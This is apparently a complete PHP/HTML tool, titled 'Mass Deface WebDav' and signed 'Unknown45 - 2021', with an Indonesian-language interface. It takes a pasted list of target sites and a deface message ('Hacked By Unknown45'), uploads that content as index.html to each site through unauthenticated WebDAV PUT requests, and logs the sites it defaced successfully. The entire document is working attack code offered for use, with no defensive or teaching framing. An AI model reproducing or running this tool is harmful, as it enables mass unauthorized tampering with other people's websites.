<head>
<meta name="viewport" content="width=device-width, initial-scale=1" /> 
<script src="https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@latest/pace-theme-default.min.css">
<title>[+] Mass Deface WebDav [+]</title>
</head>
<body bgcolor="#1e1e1e" text="white">
<style>
	@import url('https://fonts.googleapis.com/css?family=Staatliches');

textarea {
max-width: 90%;
width: 100%;
height: 150px;
resize: none;
outline: none;
overflow: auto;
background: transparent;
color: #ffffff;
}

button {
	background: transparent;
    font-family: Staatliches;
	color: #ffffff;
	border-color: #ffffff;
	cursor: pointer;
}

input {
	background: transparent;
	font-family: Staatliches;
	color: #ffffff;
	border-color: #ffffff;
	cursor: pointer;
}

font {
	font-family: Staatliches;
}

body::-webkit-scrollbar {
  width: 12px;               /* width of the entire scrollbar */
}

body::-webkit-scrollbar-track {
  background: #1e1e1e;        /* color of the tracking area */
}

body::-webkit-scrollbar-thumb {
  background-color: #1e1e1e;    /* color of the scroll thumb */
  border: 3px solid gray;  /* creates padding around scroll thumb */
}
</style>
<center>
<font face=courier new size=5>WebDav Mass Auto Deface</font><hr><font face=courier new size=3>Masukkan Situs Dibawah
<form action="" method="POST">
<textarea name="isi" style="height:150px;width:350px"></textarea><br><br>Masukkan Script Deface<br>
<textarea name="isi1" style="height:150px;width:350px">Hacked By Unknown45</textarea><br><br>
<input type="hidden" name="site" value="list.txt">
<input type="hidden" name="file" value="index.html"><small>
<center>Maximal 10 Web per Submit Supaya Gak Lama Nunggu <br>( Tergantung Speed Internet )</center></small>
<br><center><input type="submit" name="go" value="Deface"></center>
</form>
</td></tr></table>
<table> <tr><th>Hasil Deface</th></tr> <tr><td>
<?php
if (file_exists("/tmp/tempku")) {
} else {
	passthru("mkdir /tmp/tempku");
}

if($_POST['go']){

	$nama = "temp/index.html";
	$isi = $_POST['isi1'];
	$fp = fopen($nama,"w");
	fputs($fp, $isi);
   
	$nama = "/tmp/tempku/list.txt";
	$isi = $_POST['isi'];
	$fp = fopen($nama,"w");
	fputs($fp, $isi);
     
   

?>
<?php
$sites = $_POST['site'];
$file = $_POST['file'];
$fp = fopen($file, "r");
$buka=fopen("/tmp/tempku/".$sites,"r");
$filesize = filesize($file);
$size=filesize("$sites");
$baca=fread($buka,$size);
$sites = explode("\r\n", $baca);
foreach($sites as $site){
if(preg_match("#http://#", $site)) {
    $site = $site;
 } else {
   $site = "http://".$site;
 }
$site = "$site/$file";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $site);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux x86_64; rv:24.0) Gecko/20140722 Firefox/24.0 Iceweasel/24.7.0");
curl_setopt($ch, CURLOPT_PUT, true);
curl_setopt($ch, CURLOPT_INFILE, $fp);
curl_setopt($ch, CURLOPT_INFILESIZE, $filesize);
curl_setopt($ch, CURLOPT_COOKIEJAR,'/tmp/tempku/coker_log');
curl_setopt($ch, CURLOPT_COOKIEFILE,'/tmp/tempku/coker_log');
$exec = curl_exec($ch);
echo "<font size=3>$site -> ";
$su = curill($site);
if(preg_match("/hacked/i", $su)) {
    echo "<font color=green>Success</font><br>\n\n";
   file_put_contents("/tmp/tempku/webdav_shell.htm", "$site<br>", FILE_APPEND);
} else {
  echo "<font color=red>Failed</font><br>\n";
  }
}
}
function curill($site){
  $ch = curl_init ("$site");
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR,'/tmp/tempku/coker_log');
curl_setopt($ch, CURLOPT_COOKIEFILE,'/tmp/tempku/coker_log');
$data3 = curl_exec ($ch);
return $data3;
 }
?>
</div>
</td></tr>
<center><hr><font size=3>Unknown45 - 2021 <hr></font>

